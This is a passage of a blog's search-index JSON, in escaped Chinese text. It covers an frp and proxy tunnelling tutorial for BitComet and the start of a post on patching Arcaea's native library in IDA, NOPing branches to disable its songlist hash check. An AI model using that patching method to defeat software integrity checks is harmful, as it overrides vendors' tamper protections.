\u5730\u5740\u65f6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7 [ \u548c ] \u3002 server_port \u548c frps.ini \u4fdd\u6301\u4e00\u81f4\u3002 protocol \u4e00\u5f8b\u9009\u62e9 websocket \u3002 token \u548c tls_enable \u5747\u4e0e frps.ini \u4fdd\u6301\u4e00\u81f4\u3002 Remote Download \u6307\u7684\u662f\u6bd4\u7279\u5f57\u661f\u7684\u8fdc\u7a0b\u4e0b\u8f7d\u670d\u52a1\uff0c\u5982\u679c\u4f60\u6bd4\u7279\u5f57\u661f\u9700\u8981\u5f00\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u628a\u4ed6\u6253\u5f00\uff0c\u7aef\u53e3\u53f7\u548c\u6bd4\u7279\u5f57\u661f\u4e0a\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\uff0c\u6bd4\u5982 2333 \u3002 BT Listen TCP/UDP \u5c31\u662f peer \u7684\u901a\u4fe1\u7aef\u53e3\uff0c\u5747\u8bbe\u7f6e\u6210 127.0.0.1 \u4e0a\u7684 10400 \uff0c\u548c\u6bd4\u7279\u5f57\u661f\u4fdd\u6301\u4e00\u81f4\u3002 eMule Listen TCP/UDP \u662f\u6bd4\u7279\u5f57\u661f\u7535\u9a74\u63d2\u4ef6\u7684\u901a\u4fe1\u7aef\u53e3\uff0c\u5747\u8bbe\u7f6e\u6210 127.0.0.1 \u4e0a\u7684 22224 \uff0c\u548c\u6bd4\u7279\u5f57\u661f\u4e0e\u7535\u9a74\u63d2\u4ef6\u5185\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\u3002\u5982\u679c\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u7248\u672c\u6ca1\u6709\u7535\u9a74\u63d2\u4ef6\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u5ffd\u7565\u8be5\u9879\u3002 \u6d4b\u8bd5 frp \u8fde\u63a5 \u00b6 \u73b0\u5728\u5728\u4f60\u7684\u5ba2\u6237\u7aef\u4e0a\u6267\u884c\uff1a frpc.exe -c frpc.ini \u5ba2\u6237\u7aef\u4e0a\u5e94\u8be5\u4f1a\u663e\u793a\u65e5\u5fd7\uff1a 2022/04/18 15:04:44 [I] [service.go:301] [39744ebb9b0e3aab] login to server success, get run id [39744ebb9b0e3aab], server udp port [7000] 2022/04/18 15:04:44 [I] [proxy_manager.go:144] [39744ebb9b0e3aab] proxy added: [eMule Listen UDP Remote Download BT Listen TCP BT Listen UDP eMule Listen TCP] 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [eMule Listen UDP] start proxy success 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [BT Listen TCP] start proxy success 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [Remote Download] start proxy success 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [BT Listen UDP] start proxy success 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [eMule Listen TCP] start proxy success 2022/04/18 15:04:45 [I] [proxy.go:481] [39744ebb9b0e3aab] [eMule Listen UDP] incoming a new work connection for udp proxy, ws://XXX.XXX.XXX.XXX:7000/~!frp 2022/04/18 15:04:45 [I] [proxy.go:481] [39744ebb9b0e3aab] [BT Listen UDP] incoming a new work connection for udp proxy, ws://XXX.XXX.XXX.XXX:7000/~!frp``` \u540c\u65f6\u670d\u52a1\u7aef\u4e0a\u5e94\u8be5\u4f1a\u7acb\u5373\u663e\u793a\u4e00\u6761\u65e5\u5fd7\uff1a 2022/04/13 09:43:21 [I] [service.go:447] [39744ebb9b0e3aab] client login info: ip http://XXX.XXX.XXX.XXX:7000 version [0.38.0] hostname [] os [windows] arch [amd64] \u5176\u4e2d\u7684 XXX.XXX.XXX.XXX:7000 \u5e94\u8be5\u662f\u4f60\u670d\u52a1\u7aef\u7684 IP + \u7aef\u53e3\uff0c\u800c 39744ebb9b0e3aab \u662f\u4f60\u88ab\u670d\u52a1\u7aef\u5206\u914d\u7684\u7528\u6237 ID\uff0c\u6bcf\u6b21\u4f60\u8fde\u63a5\u5230\u670d\u52a1\u7aef\u65f6\uff0c\u90fd\u4f1a\u88ab\u670d\u52a1\u7aef\u968f\u673a\u5206\u914d\u4e00\u4e2a\u7528\u6237 ID\u3002 graph TB PeerA((peer1)) --> frps_10400; PeerB((peer2)) --> frps_10400; subgraph frps.exe frps_10400[0.0.0.0:10400] --> frps_7000; end frps_7000[0.0.0.0:7000] --> |websocket| frpc[frpc]; subgraph frpc and BitComit bitcomit_10400 --> frpc; end frpc --> bitcomit_10400[localhost:10400]; \u73b0\u5728\uff0c\u6240\u6709 peers \u53d1\u9001\u5230\u90a3\u53f0\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u7684 allow_ports \u7aef\u53e3\uff08\u5305\u62ec 10400 \uff09\u7684 TCP \u548c UDP \u6570\u636e\u5305\uff0c\u90fd\u4f1a\u88ab frps.exe \u901a\u8fc7\u53cd\u5411 websocket \u8f6c\u53d1\u56de\u5ba2\u6237\u7aef\u4e0a\u7684 frpc.exe \uff0c\u7136\u540e frpc.exe \u518d\u53d1\u9001\u5230 localhost:10400 \uff0c\u7531\u4e8e\u6b64\u65f6\u6bd4\u7279\u5f57\u661f\u6b63\u5728\u76d1\u542c\u672c\u5730\u7684 10400 \u7aef\u53e3\uff0c\u56e0\u6b64\u6bd4\u7279\u5f57\u661f\u5c06\u4f1a\u628a\u8fd9\u4e9b frpc.exe \u53d1\u6765\u7684\u6570\u636e\u5305\u8ba4\u4e3a\u662f peers \u53d1\u9001\u8fc7\u6765\u7684\u6570\u636e\u5305\u3002 \u8bbe\u7f6e\u4ee3\u7406 \u00b6 frp \u53ea\u80fd\u89e3\u51b3\u4e00\u4e2a\u65b9\u5411\u4e0a\u7684\u95ee\u9898\uff0c\u5c31\u662f peers \u8fde\u63a5\u5230\u5ba2\u6237\u7aef\uff0c\u800c\u5ba2\u6237\u7aef\u8fde\u63a5\u5230 peers \u7684\u65b9\u5f0f\u5c06\u4f1a\u7531\u4ee3\u7406\u670d\u52a1\u5668\u5b9e\u73b0\u3002 \u4f60\u9700\u8981\u5728\u90a3\u53f0\u5177\u6709\u516c\u7f51 IP \u5730\u5740\u7684\u673a\u5668\u4e0a\u642d\u5efa\u4e00\u4e2a\u4ee3\u7406\u670d\u52a1\uff0c\u4ece\u800c\u8ba9\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u80fd\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u5230 peers\u3002 \u5177\u4f53\u642d\u5efa\u65b9\u6cd5\u8fd9\u91cc\u4e0d\u505a\u4ecb\u7ecd\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6559\u7a0b\u3002\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u642d\u5efa\u597d\u4e86\u8fd9\u4e2a\u4ee3\u7406\uff0c\u5e76\u4e14\u6620\u5c04\u5728\u4e86 socks5://localhost:1089 \u4e0a\u3002 \u7136\u540e\u6211\u4eec\u5728\u6bd4\u7279\u5f57\u661f\u8bbe\u7f6e\u91cc\u505a\u597d\u4ee3\u7406\u8bbe\u7f6e\u3002 \u9664\u4e86 \u4f7f\u7528\u4ee3\u7406\u670d\u52a1\u5668\u8fdb\u884c DNS \u67e5\u8be2 \u4ee5\u5916\uff0c\u5176\u4ed6\u90fd\u4e0d\u52fe\u9009\u3002\u8fd9\u76f8\u5f53\u4e8e\u4f7f\u6bd4\u7279\u5f57\u661f\u8fdb\u5165\u5168\u5c40\u4ee3\u7406\u6a21\u5f0f\u3002 \u6b64\u65f6\u6211\u4eec\u5df2\u7ecf\u7b49\u4ef7\u4e8e\u5177\u6709\u4e86\u516c\u7f51 IP\uff0c\u5e76\u4e14\u53ef\u4ee5\u4ee5\u516c\u7f51 IP \u8eab\u4efd\u4e0e\u4e92\u8054\u7f51\u8fdb\u884c\u53cc\u5411\u901a\u4fe1\u3002\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\uff0c\u8fd9\u4e2a\u65f6\u5019\u6bd4\u7279\u5f57\u661f\u7684\u706f\u5df2\u7ecf\ud83d\udfe2\u4e86 \u5982\u679c\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u5ba2\u6237\u7aef\u5185\u6709\u7535\u9a74\u63d2\u4ef6\uff0c\u90a3\u4e48\u4f60\u5e94\u5f53\u540c\u65f6\u4e3a\u7535\u9a74\u63d2\u4ef6\u4e5f\u6253\u5f00\u4ee3\u7406\u3002\u5982\u56fe\uff1a \u5173\u95ed\u9632\u5438\u8840 \u00b6 \u56e0\u4e3a\u6bd4\u7279\u5f57\u661f\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\u90fd\u662f frpc.exe \u53d1\u6765\u7684\uff0c\u56e0\u6b64\u6240\u6709\u7684 peers \u7684\u5916\u7f51 IP \u90fd\u662f 127.0.0.1 \uff0c\u5927\u91cf\u76f8\u540c IP \u53ef\u80fd\u4f1a\u89e6\u53d1\u6bd4\u7279\u5f57\u661f\u7684\u9632\u5438\u8840\u673a\u5236\uff0c\u56e0\u6b64\u628a\u4ed6\u5173\u6389\u3002 \u6d4b\u8bd5\u6548\u679c \u00b6 \u73b0\u5728\u53bb\u4e0b\u8f7d\u4efb\u610f\u4e00\u4e2a BT \u79cd\u5b50\uff0c\u5982\u679c\u70b9\u5f00 \u7528\u6237 \u9009\u9879\u5361\uff0c\u53d1\u73b0\u5f88\u591a\u6765\u81ea 127.0.0.1 \u7684\u8fde\u63a5\uff0c\u5e76\u4e14\u6765\u6e90\u662f \u88ab\u52a8 \uff0c\u53d1\u8d77\u662f \u8fdc\u7a0b \uff0c\u6b64\u65f6\u5c31\u8bf4\u660e\u4f60\u5df2\u7ecf\u8bbe\u7f6e\u6b63\u786e\u4e86\u3002","title":"\u5229\u7528\u5185\u7f51\u7a7f\u900f\u548c\u4ee3\u7406\u83b7\u53d6\u516c\u7f51 IP \u5730\u5740\u89e3\u51b3\u6bd4\u7279\u5f57\u661f\u9ec4\u706f"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_1","text":"\u60f3\u7528\u6bd4\u7279\u5f57\u661f\u4e0b\u79cd\u5b50\uff0c\u4f46\u662f\u56e0\u4e3a\u8eab\u5904\u6570\u4e2a NAT \u8eab\u540e\uff0c\u6839\u672c\u6ca1\u6709\u516c\u7f51 IP\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8ba9\u522b\u7684 peer \u8fde\u63a5\u5230\u4f60\uff0c\u4e0b\u8f7d\u901f\u5ea6\u582a\u5fe7\u3002 \u6ca1\u6709\u516c\u7f51 IP \u600e\u4e48\u529e\uff1f\u6253\u7535\u8bdd\u95ee\u8fd0\u8425\u5546\uff1f\u8fd8\u662f\u7b97\u4e86\u5427\uff0c\u5e72\u8106\u5411\u81ea\u5df1 VPS \u501f\u4e00\u4e2a\u3002","title":"\u80cc\u666f"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_2","text":"\u4e00\u53f0\u6709\u516c\u7f51 IP \u7684\u673a\u5668\uff08\u6700\u597d\u662f\u56fa\u5b9a\u7684 IP\uff09 \u8fd9\u53f0\u673a\u5668\u88ab\u5141\u8bb8\u642d\u5efa frp \u7b49\u5185\u7f51\u7a7f\u900f\u670d\u52a1 \u8fd9\u53f0\u673a\u5668\u88ab\u5141\u8bb8\u642d\u5efa\u4ee3\u7406\u670d\u52a1","title":"\u524d\u63d0\u6761\u4ef6"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_3","text":"","title":"\u64cd\u4f5c"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#frps","text":"\u9996\u5148\u5728\u6709\u516c\u7f51 IP \u7684\u90a3\u53f0\u673a\u5668\u4e0a\u90e8\u7f72 frp \u670d\u52a1\u7aef\u3002 \u53bb release \u4e0b\u8f7d\u5bf9\u5e94\u7cfb\u7edf\u7684 frp\uff0c\u4e0b\u8f7d\u4e4b\u540e\u89e3\u538b\uff0c\u91cc\u9762\u7684 frps \u5c31\u662f\u6211\u4eec\u9700\u8981\u7684 frp \u670d\u52a1\u7aef\u3002 \u5199 frps.ini \uff1a frps.ini 1 2 3 4 5 6 7 [common] bind_port = 7000 bind_udp_port = 7000 bind_addr = 0.0.0.0 allow_ports = 1001-1500,10001-22500 token = \u4f60\u7684\u5bc6\u7801 tls_only = true \u6ce8\u610f\u4ee5\u4e0b\u914d\u7f6e\u9879\uff1a allow_ports \u662f\u6307\u7ecf\u8fc7 frp \u4ee3\u7406/\u8f6c\u53d1\u7684\u8fde\u63a5\u53ef\u4ee5\u4f7f\u7528\u7684\u7aef\u53e3\u8303\u56f4\u3002 token \u8bf7\u81ea\u5df1\u968f\u4fbf\u8bbe\u7f6e\u4e00\u4e2a\u3002 tls_only \u5219\u8981\u6c42\u6240\u6709\u7684 frpc \u5ba2\u6237\u7aef\uff08\u662f\u4f60\uff0c\u4e0d\u662f\u6307\u90a3\u4e9b peers\uff09\u4e5f\u542f\u7528 TLS \u624d\u80fd\u8fde\u63a5\u3002\u5efa\u8bae\u8bbe\u7f6e\u6210 true \u3002 \u5176\u4ed6\u7684\u53c2\u6570\u53ef\u4ee5\u901a\u8fc7 \u5b98\u7f51\u6587\u6863 \u67e5\u770b\u3002 \u7136\u540e\u901a\u8fc7 frps.exe -c frps.ini \u542f\u7528 frps \u670d\u52a1\u7aef\u3002 \u6b64\u65f6\u4f60\u7684\u670d\u52a1\u7aef\u4e0a\u5e94\u8be5\u663e\u793a\u5982\u4e0b\u65e5\u5fd7\uff1a 2022/04/13 09:42:18 [I] [root.go:200] frps uses config file: frps.ini 2022/04/13 09:42:18 [I] [service.go:192] frps tcp listen on 0.0.0.0:7000 2022/04/13 09:42:18 [I] [service.go:276] nat hole udp service listen on 0.0.0.0:7000 2022/04/13 09:42:18 [I] [root.go:209] frps started successfully \u8bf4\u660e\u4f60\u7684\u670d\u52a1\u7aef\u6b63\u5728\u76d1\u542c\u6240\u6709\u6765\u81ea 7000 \u7aef\u53e3\u7684 frp \u8fde\u63a5\u3002","title":"\u90e8\u7f72 frps"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#frpc","text":"\u5728\u81ea\u5df1\u9700\u8981\u8fd0\u884c\u6bd4\u7279\u5f57\u661f\u7684\u7535\u8111\u4e0a\u90e8\u7f72 frp \u5ba2\u6237\u7aef\u3002 \u540c\u6837\uff0c\u53bb\u4e0b\u8f7d\u5bf9\u5e94\u7cfb\u7edf\u7248\u672c\u7684 frp\uff0c\u89e3\u538b\u83b7\u53d6 frpc\u3002 \u5199 frpc.ini \uff1a frpc.ini 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 [common] server_addr = \u7ed9\u5b9a\u7684IPv4\u5730\u5740/IPv6\u5730\u5740/\u57df\u540d server_port = 7000 protocol = websocket token = \u4f60\u7684\u5bc6\u7801 tls_enable = true [Remote Download] type = tcp local_ip = 127.0.0.1 local_port = 2333 remote_port = 2333 [BT Listen TCP] type = tcp local_ip = 127.0.0.1 local_port = 10400 remote_port = 10400 [BT Listen UDP] type = udp local_ip = 127.0.0.1 local_port = 10400 remote_port = 10400 [eMule Listen TCP] type = tcp local_ip = 127.0.0.1 local_port = 22224 remote_port = 22224 [eMule Listen UDP] type = udp local_ip = 127.0.0.1 local_port = 22224 remote_port = 22224 \u6ce8\u610f\u4ee5\u4e0b\u914d\u7f6e\u9879\uff1a server_addr \u8bbe\u7f6e\u6210\u90a3\u53f0\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u7684 IP \u5730\u5740\uff0c\u53ef\u4ee5\u662f IPv4/IPv6/\u57df\u540d\u3002\u8bbe\u7f6e\u6210 IPv6 \u5730\u5740\u65f6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7 [ \u548c ] \u3002 server_port \u548c frps.ini \u4fdd\u6301\u4e00\u81f4\u3002 protocol \u4e00\u5f8b\u9009\u62e9 websocket \u3002 token \u548c tls_enable \u5747\u4e0e frps.ini \u4fdd\u6301\u4e00\u81f4\u3002 Remote Download \u6307\u7684\u662f\u6bd4\u7279\u5f57\u661f\u7684\u8fdc\u7a0b\u4e0b\u8f7d\u670d\u52a1\uff0c\u5982\u679c\u4f60\u6bd4\u7279\u5f57\u661f\u9700\u8981\u5f00\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u628a\u4ed6\u6253\u5f00\uff0c\u7aef\u53e3\u53f7\u548c\u6bd4\u7279\u5f57\u661f\u4e0a\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\uff0c\u6bd4\u5982 2333 \u3002 BT Listen TCP/UDP \u5c31\u662f peer \u7684\u901a\u4fe1\u7aef\u53e3\uff0c\u5747\u8bbe\u7f6e\u6210 127.0.0.1 \u4e0a\u7684 10400 \uff0c\u548c\u6bd4\u7279\u5f57\u661f\u4fdd\u6301\u4e00\u81f4\u3002 eMule Listen TCP/UDP \u662f\u6bd4\u7279\u5f57\u661f\u7535\u9a74\u63d2\u4ef6\u7684\u901a\u4fe1\u7aef\u53e3\uff0c\u5747\u8bbe\u7f6e\u6210 127.0.0.1 \u4e0a\u7684 22224 \uff0c\u548c\u6bd4\u7279\u5f57\u661f\u4e0e\u7535\u9a74\u63d2\u4ef6\u5185\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\u3002\u5982\u679c\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u7248\u672c\u6ca1\u6709\u7535\u9a74\u63d2\u4ef6\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u5ffd\u7565\u8be5\u9879\u3002","title":"\u90e8\u7f72 frpc"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#frp","text":"\u73b0\u5728\u5728\u4f60\u7684\u5ba2\u6237\u7aef\u4e0a\u6267\u884c\uff1a frpc.exe -c frpc.ini \u5ba2\u6237\u7aef\u4e0a\u5e94\u8be5\u4f1a\u663e\u793a\u65e5\u5fd7\uff1a 2022/04/18 15:04:44 [I] [service.go:301] [39744ebb9b0e3aab] login to server success, get run id [39744ebb9b0e3aab], server udp port [7000] 2022/04/18 15:04:44 [I] [proxy_manager.go:144] [39744ebb9b0e3aab] proxy added: [eMule Listen UDP Remote Download BT Listen TCP BT Listen UDP eMule Listen TCP] 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [eMule Listen UDP] start proxy success 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [BT Listen TCP] start proxy success 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [Remote Download] start proxy success 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [BT Listen UDP] start proxy success 2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [eMule Listen TCP] start proxy success 2022/04/18 15:04:45 [I] [proxy.go:481] [39744ebb9b0e3aab] [eMule Listen UDP] incoming a new work connection for udp proxy, ws://XXX.XXX.XXX.XXX:7000/~!frp 2022/04/18 15:04:45 [I] [proxy.go:481] [39744ebb9b0e3aab] [BT Listen UDP] incoming a new work connection for udp proxy, ws://XXX.XXX.XXX.XXX:7000/~!frp``` \u540c\u65f6\u670d\u52a1\u7aef\u4e0a\u5e94\u8be5\u4f1a\u7acb\u5373\u663e\u793a\u4e00\u6761\u65e5\u5fd7\uff1a 2022/04/13 09:43:21 [I] [service.go:447] [39744ebb9b0e3aab] client login info: ip http://XXX.XXX.XXX.XXX:7000 version [0.38.0] hostname [] os [windows] arch [amd64] \u5176\u4e2d\u7684 XXX.XXX.XXX.XXX:7000 \u5e94\u8be5\u662f\u4f60\u670d\u52a1\u7aef\u7684 IP + \u7aef\u53e3\uff0c\u800c 39744ebb9b0e3aab \u662f\u4f60\u88ab\u670d\u52a1\u7aef\u5206\u914d\u7684\u7528\u6237 ID\uff0c\u6bcf\u6b21\u4f60\u8fde\u63a5\u5230\u670d\u52a1\u7aef\u65f6\uff0c\u90fd\u4f1a\u88ab\u670d\u52a1\u7aef\u968f\u673a\u5206\u914d\u4e00\u4e2a\u7528\u6237 ID\u3002 graph TB PeerA((peer1)) --> frps_10400; PeerB((peer2)) --> frps_10400; subgraph frps.exe frps_10400[0.0.0.0:10400] --> frps_7000; end frps_7000[0.0.0.0:7000] --> |websocket| frpc[frpc]; subgraph frpc and BitComit bitcomit_10400 --> frpc; end frpc --> bitcomit_10400[localhost:10400]; \u73b0\u5728\uff0c\u6240\u6709 peers \u53d1\u9001\u5230\u90a3\u53f0\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u7684 allow_ports \u7aef\u53e3\uff08\u5305\u62ec 10400 \uff09\u7684 TCP \u548c UDP \u6570\u636e\u5305\uff0c\u90fd\u4f1a\u88ab frps.exe \u901a\u8fc7\u53cd\u5411 websocket \u8f6c\u53d1\u56de\u5ba2\u6237\u7aef\u4e0a\u7684 frpc.exe \uff0c\u7136\u540e frpc.exe \u518d\u53d1\u9001\u5230 localhost:10400 \uff0c\u7531\u4e8e\u6b64\u65f6\u6bd4\u7279\u5f57\u661f\u6b63\u5728\u76d1\u542c\u672c\u5730\u7684 10400 \u7aef\u53e3\uff0c\u56e0\u6b64\u6bd4\u7279\u5f57\u661f\u5c06\u4f1a\u628a\u8fd9\u4e9b frpc.exe \u53d1\u6765\u7684\u6570\u636e\u5305\u8ba4\u4e3a\u662f peers \u53d1\u9001\u8fc7\u6765\u7684\u6570\u636e\u5305\u3002","title":"\u6d4b\u8bd5 frp \u8fde\u63a5"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_4","text":"frp \u53ea\u80fd\u89e3\u51b3\u4e00\u4e2a\u65b9\u5411\u4e0a\u7684\u95ee\u9898\uff0c\u5c31\u662f peers \u8fde\u63a5\u5230\u5ba2\u6237\u7aef\uff0c\u800c\u5ba2\u6237\u7aef\u8fde\u63a5\u5230 peers \u7684\u65b9\u5f0f\u5c06\u4f1a\u7531\u4ee3\u7406\u670d\u52a1\u5668\u5b9e\u73b0\u3002 \u4f60\u9700\u8981\u5728\u90a3\u53f0\u5177\u6709\u516c\u7f51 IP \u5730\u5740\u7684\u673a\u5668\u4e0a\u642d\u5efa\u4e00\u4e2a\u4ee3\u7406\u670d\u52a1\uff0c\u4ece\u800c\u8ba9\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u80fd\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u5230 peers\u3002 \u5177\u4f53\u642d\u5efa\u65b9\u6cd5\u8fd9\u91cc\u4e0d\u505a\u4ecb\u7ecd\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6559\u7a0b\u3002\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u642d\u5efa\u597d\u4e86\u8fd9\u4e2a\u4ee3\u7406\uff0c\u5e76\u4e14\u6620\u5c04\u5728\u4e86 socks5://localhost:1089 \u4e0a\u3002 \u7136\u540e\u6211\u4eec\u5728\u6bd4\u7279\u5f57\u661f\u8bbe\u7f6e\u91cc\u505a\u597d\u4ee3\u7406\u8bbe\u7f6e\u3002 \u9664\u4e86 \u4f7f\u7528\u4ee3\u7406\u670d\u52a1\u5668\u8fdb\u884c DNS \u67e5\u8be2 \u4ee5\u5916\uff0c\u5176\u4ed6\u90fd\u4e0d\u52fe\u9009\u3002\u8fd9\u76f8\u5f53\u4e8e\u4f7f\u6bd4\u7279\u5f57\u661f\u8fdb\u5165\u5168\u5c40\u4ee3\u7406\u6a21\u5f0f\u3002 \u6b64\u65f6\u6211\u4eec\u5df2\u7ecf\u7b49\u4ef7\u4e8e\u5177\u6709\u4e86\u516c\u7f51 IP\uff0c\u5e76\u4e14\u53ef\u4ee5\u4ee5\u516c\u7f51 IP \u8eab\u4efd\u4e0e\u4e92\u8054\u7f51\u8fdb\u884c\u53cc\u5411\u901a\u4fe1\u3002\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\uff0c\u8fd9\u4e2a\u65f6\u5019\u6bd4\u7279\u5f57\u661f\u7684\u706f\u5df2\u7ecf\ud83d\udfe2\u4e86 \u5982\u679c\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u5ba2\u6237\u7aef\u5185\u6709\u7535\u9a74\u63d2\u4ef6\uff0c\u90a3\u4e48\u4f60\u5e94\u5f53\u540c\u65f6\u4e3a\u7535\u9a74\u63d2\u4ef6\u4e5f\u6253\u5f00\u4ee3\u7406\u3002\u5982\u56fe\uff1a","title":"\u8bbe\u7f6e\u4ee3\u7406"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_5","text":"\u56e0\u4e3a\u6bd4\u7279\u5f57\u661f\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\u90fd\u662f frpc.exe \u53d1\u6765\u7684\uff0c\u56e0\u6b64\u6240\u6709\u7684 peers \u7684\u5916\u7f51 IP \u90fd\u662f 127.0.0.1 \uff0c\u5927\u91cf\u76f8\u540c IP \u53ef\u80fd\u4f1a\u89e6\u53d1\u6bd4\u7279\u5f57\u661f\u7684\u9632\u5438\u8840\u673a\u5236\uff0c\u56e0\u6b64\u628a\u4ed6\u5173\u6389\u3002","title":"\u5173\u95ed\u9632\u5438\u8840"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_6","text":"\u73b0\u5728\u53bb\u4e0b\u8f7d\u4efb\u610f\u4e00\u4e2a BT \u79cd\u5b50\uff0c\u5982\u679c\u70b9\u5f00 \u7528\u6237 \u9009\u9879\u5361\uff0c\u53d1\u73b0\u5f88\u591a\u6765\u81ea 127.0.0.1 \u7684\u8fde\u63a5\uff0c\u5e76\u4e14\u6765\u6e90\u662f \u88ab\u52a8 \uff0c\u53d1\u8d77\u662f \u8fdc\u7a0b \uff0c\u6b64\u65f6\u5c31\u8bf4\u660e\u4f60\u5df2\u7ecf\u8bbe\u7f6e\u6b63\u786e\u4e86\u3002","title":"\u6d4b\u8bd5\u6548\u679c"},{"location":"blog/2022/220414-fk-arcaea-songlist-hash/","tags":["ida","arcaea"],"text":"\u73a9\u81ea\u5236\u7684\u5165\u95e8\u64cd\u4f5c\uff0c\u8bdd\u4e0d\u591a\u8bf4\uff0c\u76f4\u63a5\u5f00\u5e72\u3002 \u6240\u7528 IDA \u7248\u672c\uff1a IDA x64 Pro v7.0 \u6240\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a libcocos2dcpp.so \u4e8c\u8fdb\u5236\u6587\u4ef6\u7248\u672c\uff1a 3.12.6 \u63d0\u793a iOS \u90a3\u8fb9\u7684 Arc-mobile \u4e5f\u53ef\u4ee5\u7528\u540c\u6837\u601d\u8def\u8fdb\u884c\u4fee\u6539\u3002 \u5b9a\u4f4d \u00b6 \u9996\u5148\u5b57\u7b26\u4e32\u641c\u7d22 songlist \uff0c\u627e\u5230 songs/songlist \uff0c\u53cc\u51fb\u3002 \u53f3\u952e Xrefs graph to \uff0c\u770b\u770b\u8fd9\u4e2a\u53d8\u91cf\u88ab\u5f15\u7528\u7684\u4f4d\u7f6e\u3002 \u8fd9\u51e0\u4e2a\u51fd\u6570\u91cc\uff0c\u603b\u6709\u4e00\u4e2a\u662f\u5bf9 songlist \u505a\u54c8\u5e0c\u6821\u9a8c\u7684\uff0c\u90a3\u5c31\u4e00\u4e2a\u4e00\u4e2a\u6765\u770b\u5457\u3002\u8ba9\u6211\u4eec\u8282\u7ea6\u4e00\u70b9\u65f6\u95f4\uff0c\u5047\u8bbe\u5927\u5bb6\u8fd0\u6c14\u90fd\u5f88\u597d\uff0c\u4e00\u4e0a\u6765\u90fd\u6253\u7b97\u6765\u731c sub_9450EC \u8fd9\u4e2a\u51fd\u6570\u3002 \u53ef\u89c1\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u4ec5\u4ec5\u7528\u4e86 songs/songlist \uff0c\u8fd8\u7528\u5230\u4e86 songs/packlist \u548c songs/unlocks \u7b49\u8def\u5f84\u3002\u90a3\u770b\u6765\u5c31\u662f\u8fd9\u4e2a\u51fd\u6570\u4e86\uff01 \u55ef\uff0cF5\u3002 \u89c2\u5bdf\u8fd9\u4e00\u957f\u4e32 if \u8bed\u53e5\u5757\uff1a \u6700\u540e\u8fd9\u91cc\u662f\u76f4\u63a5\u8c03\u7528 exit() \u51fd\u6570\u3002\u90a3\u770b\u6765\u5c31\u662f\u8fd9\u4e86\u3002 \u56de\u5230 IDA View \uff0c\u770b\u770b exit() \u51fd\u6570\u5728\u54ea\u3002 \u627e\u5230\u8c03\u7528 exit() \u51fd\u6570\u7684\u6807\u7b7e loc_9459F0 \uff0c\u5411\u4e0a\u9ad8\u4eae\u6240\u6709\u8df3\u8f6c\u5230\u8fd9\u4e2a\u6807\u7b7e\u7684\u6307\u4ee4\u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u90fd\u662f\u4e00\u4e9b CBNZ \u548c B.NE \u6307\u4ee4\uff0c\u90a3\u5c31\u5f88\u597d\u529e\u4e86\uff0c\u5168\u90e8\u6539\u6210 NOP \u5c31\u884c\u3002 \u4fee\u6539 \u00b6 \u76f4\u63a5\u4e0a Keypatch\u3002 \u603b\u51716\u5904\uff0c\u5168\u90e8\u6539\u6210 NOP \uff0c\u6539\u5b8c\u518d F5 \u4e00\u6b21\uff0c\u641c\u4e00\u4e0b exit \u3002 \u770b\u6765\u5df2\u7ecf\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a exit \u4e86\uff0c\u6536\u5de5\u3002","title":"\u89e3\u9664 Arcaea \u5bf9 songlist 